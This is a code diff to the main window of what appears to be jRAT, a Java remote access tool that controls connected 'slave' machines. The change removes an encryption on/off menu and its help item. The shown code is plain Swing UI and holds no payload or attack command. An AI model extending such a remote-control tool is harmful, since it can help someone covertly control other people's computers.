@@ -31,7 +31,6 @@ import javax.swing.JMenuItem;
 import javax.swing.JOptionPane;
 import javax.swing.JPanel;
 import javax.swing.JPopupMenu;
-import javax.swing.JRadioButtonMenuItem;
 import javax.swing.JScrollPane;
 import javax.swing.JSeparator;
 import javax.swing.JTabbedPane;
@@ -53,7 +52,6 @@ import se.jrat.client.AbstractSlave;
 import se.jrat.client.Constants;
 import se.jrat.client.ErrorDialog;
 import se.jrat.client.Globals;
-import se.jrat.client.Help;
 import se.jrat.client.Main;
 import se.jrat.client.SampleMode;
 import se.jrat.client.Slave;
@@ -125,7 +123,6 @@ public class Frame extends BaseFrame {
 	public static final int PING_ICON_DOT = 0;
 	public static final int PING_ICON_CIRC = 1;
 
-	private final ButtonGroup encryptionButtonGroup = new ButtonGroup();
 	private JMenu mnPlugins;
 	private JCheckBoxMenuItem chckbxmntmTransferPluginsIf;
 
@@ -158,41 +155,6 @@ public class Frame extends BaseFrame {
 		});
 		mntmAddSocket.setIcon(new ImageIcon(Frame.class.getResource("/icons/socket_add.png")));
 		mnMain.add(mntmAddSocket);
-
-		JMenu mnEncryption = new JMenu("Encryption");
-		mnEncryption.setIcon(new ImageIcon(Frame.class.getResource("/icons/key.png")));
-		mnMain.add(mnEncryption);
-
-		JRadioButtonMenuItem rdbtnmntmEnable = new JRadioButtonMenuItem("Enable");
-		rdbtnmntmEnable.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				Slave.toggleEncryption(true);
-				Settings.getGlobal().setVal("encryption", true);
-			}
-		});
-		rdbtnmntmEnable.setSelected(true);
-		encryptionButtonGroup.add(rdbtnmntmEnable);
-		mnEncryption.add(rdbtnmntmEnable);
-
-		JRadioButtonMenuItem rdbtnmntmDisable = new JRadioButtonMenuItem("Disable");
-		rdbtnmntmDisable.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent e) {
-				Slave.toggleEncryption(false);
-				Settings.getGlobal().setVal("encryption", false);
-			}
-		});
-		encryptionButtonGroup.add(rdbtnmntmDisable);
-		mnEncryption.add(rdbtnmntmDisable);
-		mnEncryption.addSeparator();
-
-		JMenuItem menuItem_1 = new JMenuItem("?");
-		menuItem_1.addActionListener(new ActionListener() {
-			public void actionPerformed(ActionEvent arg0) {
-				Help.help("If you are experiencing problems with languages such as \nRussian, Ukrainan, Hebrew, Indian, Chinese, Arabian and others\n disable encryption to be able to view such characters");
-			}
-		});
-		menuItem_1.setIcon(new ImageIcon(Frame.class.getResource("/icons/information-button.png")));
-		mnEncryption.add(menuItem_1);
 
 		if (Main.liteVersion) {
 			mnMain.addSeparator();
